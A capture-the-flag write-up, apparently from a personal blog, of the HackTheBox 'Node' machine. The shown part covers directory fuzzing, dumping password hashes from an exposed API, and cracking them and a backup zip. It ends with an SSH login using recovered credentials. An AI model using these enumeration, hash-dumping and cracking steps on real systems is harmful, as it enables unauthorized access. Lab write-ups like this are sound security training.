<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox - Node" /><meta property="og:locale" content="en" /><meta name="description" content="Overview" /><meta property="og:description" content="Overview" /><link rel="canonical" href="https://yufongg.github.io/posts/Node/" /><meta property="og:url" content="https://yufongg.github.io/posts/Node/" /><meta property="og:site_name" content="Yufong" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-27T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Node" /><meta name="twitter:site" content="@yufongg" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-09T02:05:28+08:00","datePublished":"2022-08-27T00:00:00+08:00","description":"Overview","headline":"HackTheBox - Node","mainEntityOfPage":{"@type":"WebPage","@id":"https://yufongg.github.io/posts/Node/"},"url":"https://yufongg.github.io/posts/Node/"}</script><title>HackTheBox - Node | Yufong</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Yufong"><meta name="application-name" content="Yufong"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Bob 1.0.1/images/koko.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Yufong</a></div><div class="site-subtitle font-italic">OSCP | Infosec Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/yufongg" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/watch?v=7hjHZOc-e4w" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="http://discordapp.com/users/175250797578158080" aria-label="discord" target="_blank" rel="noopener"> <i class="fab fa-discord"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/834331" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fa fa-cube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - Node</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220828004917.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>HackTheBox - Node</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/yufongg">yufongg</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1661529600" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-08-27 </em> </span> <span> Updated <em class="timeago" data-ts="1749405928" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2025-06-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4293 words"> <em>23 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview</h1><p>This machine begins w/ a web enumeration, revealing a directory <code class="language-plaintext highlighter-rouge">/api</code> when intercepting a login request w/ burp. By directory enumerating <code class="language-plaintext highlighter-rouge">/api</code>, login credentials are revealed.</p><p>After authenticating w/ an admin account, a password protected zipfile <code class="language-plaintext highlighter-rouge">myplace.backup</code> can be downloaded, after bruteforcing the password w/ <code class="language-plaintext highlighter-rouge">fcrackzip</code>, the entire source code of the web application is zipped, revealing SSH credentials, allowing us to obtain <code class="language-plaintext highlighter-rouge">mark</code> user.</p><p>For privilege escalation, we first have to privilege escalate to mark using a task scheduler application running as <code class="language-plaintext highlighter-rouge">tom</code> that executes commands from a <code class="language-plaintext highlighter-rouge">mongodb</code> collection. With the credentials from earlier, we are able to access <code class="language-plaintext highlighter-rouge">mongodb</code> and insert a reverse shell into the <code class="language-plaintext highlighter-rouge">mongodb</code> collection, allowing us to privilege escalate to <code class="language-plaintext highlighter-rouge">tom</code></p><p>There are 2 ways to privilege escalate to root. The first way is via command injection. There is a SUID binary <code class="language-plaintext highlighter-rouge">backup</code> that backups a directory that is specified, however there are filters such as <code class="language-plaintext highlighter-rouge">/root, /etc, ;, |</code>, which are filters that will prevent us from obtaining <code class="language-plaintext highlighter-rouge">root.txt</code> and doing command injection. However, command injection is still possible because the command is called by <code class="language-plaintext highlighter-rouge">system</code>, allowing us to insert/add commands w/ newlines (<code class="language-plaintext highlighter-rouge">\n</code>), using printf, we are able to insert newlines and execute a shell as <code class="language-plaintext highlighter-rouge">root</code>, privilege escalating us to <code class="language-plaintext highlighter-rouge">root</code>.</p><p>The second way is through bufferoverflow, ret2libc attack.</p><h1 id="takeaways">Takeaways</h1><p>I learnt about bufferoverflow ret2libc attack, and command injection</p><hr /><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Box Name<td>Node<tr><td>IP<td>10.10.10.58<tr><td>Points<td>-<tr><td>Difficulty<td>Medium<tr><td>Creator<td><a href="https://www.hackthebox.com/home/users/profile/3853">rastating</a><tr><td>Release Date<td>14-Oct-2017</table></div><h1 id="recon">Recon</h1><h2 id="tcp3000-http">TCP/3000 (HTTP) <a href="#tcp3000-http" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="ffuf">FFUF <a href="#ffuf" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>┌──(root💀kali)-[~/htb/node]
└─# ffuf -u http://$ip:3000/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php,.cgi,.log' -fw 727

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.58:3000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php .cgi .log 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 727
________________________________________________

assets                  [Status: 301, Size: 171, Words: 7, Lines: 10]
uploads                 [Status: 301, Size: 173, Words: 7, Lines: 10]
vendor                  [Status: 301, Size: 171, Words: 7, Lines: 10]
:: Progress: [27690/27690] :: Job [1/1] :: 1985 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
</pre></table></code></div></div><h1 id="initial-foothold">Initial Foothold</h1><h2 id="tcp3000-http---directory-enumerate-api">TCP/3000 (HTTP) - Directory Enumerate /api <a href="#tcp3000-http---directory-enumerate-api" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Proceed to <code class="language-plaintext highlighter-rouge">http://node.htb/login</code>, determine if page is susceptible to SQLi Auth Bypass <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220313180212.png" alt="" data-proofer-ignore><ul><li>Failed</ul><li>Intercept w/ burpsuite <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220313180354.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">/api/session/authenticate</code> is queried<li>JSON Request</ul><li>View files that are queried on this website<ul><li><code class="language-plaintext highlighter-rouge">Inspect Element -&gt; Sources -&gt; js -&gt; app -&gt; controllers</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220313181248.png" alt="" data-proofer-ignore><ul><li>Files in <code class="language-plaintext highlighter-rouge">/api</code> directory is being queried</ul></ul><li>Enumerate <code class="language-plaintext highlighter-rouge">files/dirs</code> in <code class="language-plaintext highlighter-rouge">/api</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/node]
 └─# ffuf -u http://$ip:3000/api/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php,.cgi,.log' -fw 727

         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
          \ \_\   \ \_\  \ \____/  \ \_\       
           \/_/    \/_/   \/___/    \/_/       

        v1.3.1 Kali Exclusive &lt;3
 ________________________________________________

  :: Method           : GET
  :: URL              : http://10.10.10.58:3000/api/FUZZ
  :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
  :: Extensions       : .html .txt .php .cgi .log 
  :: Follow redirects : false
  :: Calibration      : false
  :: Timeout          : 10
  :: Threads          : 40
  :: Matcher          : Response status: 200,204,301,302,307,401,403,405
  :: Filter           : Response words: 727
 ________________________________________________

 session                 [Status: 200, Size: 23, Words: 1, Lines: 1]
 users                   [Status: 200, Size: 611, Words: 1, Lines: 1]
 :: Progress: [27690/27690] :: Job [1/1] :: 1191 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
</pre></table></code></div></div><li>View enumerated directories<ul><li><code class="language-plaintext highlighter-rouge">session</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220313181914.png" alt="" data-proofer-ignore><li><code class="language-plaintext highlighter-rouge">users</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>  ┌──(root💀kali)-[~/htb/node]
  └─# curl -s $ip:3000/api/users | python -m json.tool
  [
      {
          "_id": "59a7365b98aa325cc03ee51c",
          "is_admin": true,
          "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
          "username": "myP14ceAdm1nAcc0uNT"
      },
      {
          "_id": "59a7368398aa325cc03ee51d",
          "is_admin": false,
          "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
          "username": "tom"
      },
      {
          "_id": "59a7368e98aa325cc03ee51e",
          "is_admin": false,
          "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
          "username": "mark"
      },
      {
          "_id": "59aa9781cced6f1d1490fce9",
          "is_admin": false,
          "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
          "username": "rastating"
      }
  ]

</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220313181407.png" alt="" data-proofer-ignore></p><ul><li>Credentials obtained</ul></ul><li>Extract usernames, passwords<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/node]
 └─# curl -s $ip:3000/api/users | python -m json.tool | grep pass | cut -d ':' -f2 | sed 's/\",//g' | cut -d '"' -f2 |tee hashes.txt
 dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
 f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
 de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
 5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0

 ┌──(root💀kali)-[~/htb/node]
 └─# curl -s $ip:3000/api/users | python -m json.tool | grep user | cut -d ':' -f2 | sed 's/\",//g' | cut -d '"' -f2 |tee usernames
 myP14ceAdm1nAcc0uNT
 tom
 mark
 rastating
</pre></table></code></div></div><li>Crack hashes<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/node]
 └─# hashcat -a 0 -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt  --show
 dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester
 f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob
 de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake
	
 ┌──(root💀kali)-[~/htb/node]
 └─# hashcat -a 0 -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt  --show | cut -d ':' -f2 | tee passwords.txt
 manchester
 spongebob
 snowflake
	
 ┌──(root💀kali)-[~/htb/node/10.10.10.58/exploit]
 └─# paste -d ':' usernames passwords.txt | tee hydra_creds.txt
 myP14ceAdm1nAcc0uNT:manchester
 tom:spongebob
 mark:snowflake
 rastating:
</pre></table></code></div></div></ol><h2 id="tcp22-ssh---bruteforce">TCP/22 (SSH) - Bruteforce <a href="#tcp22-ssh---bruteforce" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Tried to SSH w/ our creds, failed<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/node/10.10.10.58/exploit]
 └─# hydra -C hydra_creds.txt -e nsr ssh://$ip
 Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-13 18:29:24
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries, ~1 try per task
 [DATA] attacking ssh://10.10.10.58:22/
 1 of 1 target completed, 0 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-13 18:29:26

</pre></table></code></div></div></ol><h2 id="tcp3000-http---backup-file">TCP/3000 (HTTP) - Backup file <a href="#tcp3000-http---backup-file" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Login w/ <code class="language-plaintext highlighter-rouge">myP14ceAdm1nAcc0uNT:manchester</code> &amp; download <code class="language-plaintext highlighter-rouge">Backup</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220313183306.png" alt="" data-proofer-ignore><ul><li>Only <code class="language-plaintext highlighter-rouge">myP14ceAdm1nAcc0uNT</code> is an admin account, the rest are ordinary accounts</ul><li>Analyze <code class="language-plaintext highlighter-rouge">myplace.backup</code><ol><li>Find out what kind of file it is<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/node/10.10.10.58/exploit]
 └─# file myplace.backup 
 myplace.backup: ASCII text, with very long lines (65536), with no line terminators
</pre></table></code></div></div><ul><li>ASCII text</ul><li>View contents<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> ....
 AAAAAAEAAAAAFBLBQYAAAAAXwNfA3edAQDQ+iUAAAA=
</pre></table></code></div></div><ul><li>= is a padding used in base64</ul><li>Decode the content of <code class="language-plaintext highlighter-rouge">myplace.backup</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/node/10.10.10.58/exploit]
 └─# cat myplace.backup | base64 -d &gt; decoded_myplace.backup 
</pre></table></code></div></div><li>Find out what kind of file it is<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/node/10.10.10.58/exploit]
 └─# file decoded_myplace.backup 
 decoded_myplace.backup: Zip archive data, at least v1.0 to extract, compression method=store
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">.zip</code> file</ul><li>Extract it<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/node/10.10.10.58/exploit]
 └─# mv decoded_myplace.backup decoded_myplace.zip
 ┌──(root💀kali)-[~/htb/node/10.10.10.58/exploit]
 └─# unzip decoded_myplace.zip 
 Archive:  decoded_myplace.zip
    creating: var/www/myplace/
 [decoded_myplace.zip] var/www/myplace/package-lock.json password: 
</pre></table></code></div></div><ul><li>Password protected</ul></ol></ol><h2 id="crack-zip-file">Crack zip file <a href="#crack-zip-file" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Crack zip file w/ fcrackzip<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/node/10.10.10.58/exploit]
 └─# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt decoded_myplace.zip 
 'var/www/myplace/' is not encrypted, skipping
 found file 'var/www/myplace/package-lock.json', (size cp/uc   4404/ 21264, flags 9, chk 0145)
 'var/www/myplace/node_modules/' is not encrypted, skipping
 'var/www/myplace/node_modules/serve-static/' is not encrypted, skipping
 found file 'var/www/myplace/node_modules/serve-static/README.md', (size cp/uc   2733/  7508, flags 9, chk 1223)
 found file 'var/www/myplace/node_modules/serve-static/index.js', (size cp/uc   1640/  4533, flags 9, chk b964)
 found file 'var/www/myplace/node_modules/serve-static/LICENSE', (size cp/uc    697/  1189, flags 9, chk 1020)
 found file 'var/www/myplace/node_modules/serve-static/HISTORY.md', (size cp/uc   2625/  8504, flags 9, chk 35bd)
 found file 'var/www/myplace/node_modules/serve-static/package.json', (size cp/uc    868/  2175, flags 9, chk 0145)
 'var/www/myplace/node_modules/utils-merge/' is not encrypted, skipping
 found file 'var/www/myplace/node_modules/utils-merge/README.md', (size cp/uc    344/   634, flags 9, chk 9f17)
 found file 'var/www/myplace/node_modules/utils-merge/index.js', (size cp/uc    219/   381, flags 9, chk 9e03)
 8 file maximum reached, skipping further files


 PASSWORD FOUND!!!!: pw == magicword
</pre></table></code></div></div><li>Unzip <code class="language-plaintext highlighter-rouge">decoded_myplace.zip</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/node/10.10.10.58/exploit]
 └─# unzip decoded_myplace.zip 
 Archive:  decoded_myplace.zip
    creating: var/www/myplace/
 [decoded_myplace.zip] var/www/myplace/package-lock.json password: magicword
</pre></table></code></div></div><li><code class="language-plaintext highlighter-rouge">/var</code> contains the files of the entire web application<li>After browsing through the files, SSH credentials in <code class="language-plaintext highlighter-rouge">app.js</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220313184940.png" alt="" data-proofer-ignore><ul><li><a href="https://stackoverflow.com/questions/38581139/difference-between-a-table-sql-and-a-collection-mongo">MongoDB</a> database<li>mark:5AYRft73VtFpc84k<h2 id="tcp22-ssh">TCP/22 (SSH) <a href="#tcp22-ssh" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2></ul><li>SSH w/ <code class="language-plaintext highlighter-rouge">mark:5AYRft73VtFpc84k</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/node]
 └─# sshpass -p '5AYRft73VtFpc84k' ssh mark@10.10.10.58
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220827175638.png" alt="" data-proofer-ignore></p></ol><h1 id="privilege-escalation---1">Privilege Escalation - 1</h1><h2 id="tom---via-adding-task-to-scheduler">Tom - Via Adding task to scheduler <a href="#tom---via-adding-task-to-scheduler" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>View files in <code class="language-plaintext highlighter-rouge">tom</code>’s home directory<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre> mark@node:/home/tom$ ls -la
 total 40
 drwxr-xr-x 6 root root 4096 Sep  3  2017 .
 drwxr-xr-x 5 root root 4096 Aug 31  2017 ..
 -rw-r--r-- 1 root root  220 Aug 29  2017 .bash_logout
 -rw-r--r-- 1 root root 3771 Aug 29  2017 .bashrc
 drwx------ 2 root root 4096 Aug 29  2017 .cache
 drwxr-xr-x 3 root root 4096 Aug 30  2017 .config
 -rw-r----- 1 root root    0 Sep  3  2017 .dbshell
 -rwxr-xr-x 1 root root    0 Aug 30  2017 .mongorc.js
 drwxrwxr-x 2 root root 4096 Aug 29  2017 .nano
 drwxr-xr-x 5 root root 4096 Aug 31  2017 .npm
 -rw-r--r-- 1 root root  655 Aug 29  2017 .profile
 -rw-r----- 1 root tom    33 Sep  3  2017 user.txt
 mark@node:/home/tom$ 

</pre></table></code></div></div><ul><li>User Flag is there, we have to privilege escalate to Tom.</ul><li>Found something interesting w/ <code class="language-plaintext highlighter-rouge">linpeas</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220313193217.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">/usr/bin/node /var/scheduler/app.js</code><ul><li><code class="language-plaintext highlighter-rouge">scheduler</code> running as <code class="language-plaintext highlighter-rouge">tom</code></ul><li><code class="language-plaintext highlighter-rouge">/usr/bin/node /var/www/myplace/app.js</code><ul><li>Web application running as <code class="language-plaintext highlighter-rouge">tom</code></ul></ul><li>View contents of <code class="language-plaintext highlighter-rouge">/var/scheduler/app.js</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span 